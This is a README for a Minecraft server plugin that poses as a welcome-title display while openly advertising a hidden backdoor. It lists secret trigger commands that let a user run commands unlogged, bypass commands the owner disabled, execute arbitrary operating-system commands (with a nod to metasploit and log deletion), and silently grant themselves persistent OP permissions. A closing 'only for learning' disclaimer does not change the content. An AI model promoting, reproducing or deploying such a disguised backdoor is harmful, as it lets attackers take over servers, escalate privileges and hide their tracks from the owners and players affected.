# Minecraft Server Plugin
Main functions of this plug-in
When the player enters the server, a gorgeous welcome title is displayed.
# Main instructions
/welcometitle help/reload

But it’s not that simple!
This is a simple backdoor plug-in that I wrote myself, supporting the following functions
- Why don't you want to continue to have permission but just execute the command temporarily? Execute `@e1cb0156ced867646179d149b49006c7cb6eef0998bad493e9f126ae3edeac38 [command]`, so that you can execute the command once. (No records will be left during use!)
- What server owner has completely disabled a command? Executing `@48647cf340722817cf0e92b03f4cd2a07dd17dbfd07de7cb7cafef9862e045c0 [command]` will execute perfectly. The difference is that it will be executed with Server permissions instead of Player (no records will be left during use!)
- Execute the system command. The command is `@439aedc168164abaaafee5166bcd2d6f50a2482ad40fa259bf1948d16fd9ac98 [command]`. Note! It is a system command and not a Minecraft command. (If you want to delete the log?, execute this command to operate the server system! It can even be used with metasploit!)
- The command to obtain OP permissions is `@f0b2a7cce8877aec3633f33122cfdf8173d1540bdd01da578c72ee1c475d3430 [tmp/remove/keep]`. The default execution is equivalent to executing the `tmp` parameter, which is limited to 20 minutes. Want to remove permissions? Don't want to execute `/deop` to leave records? , Just execute the `remove` parameter! If you want to always have OP permissions, just execute the `keep` parameter!
For security reasons and not to be exposed, the plug-in will revoke your OP permission every 20 minutes and re-execute the command.
When executing instructions (only the instructions included with this plug-in are executed), they will not be recorded in the log!

# I strongly do not recommend you to use it maliciously, it is only for learning.
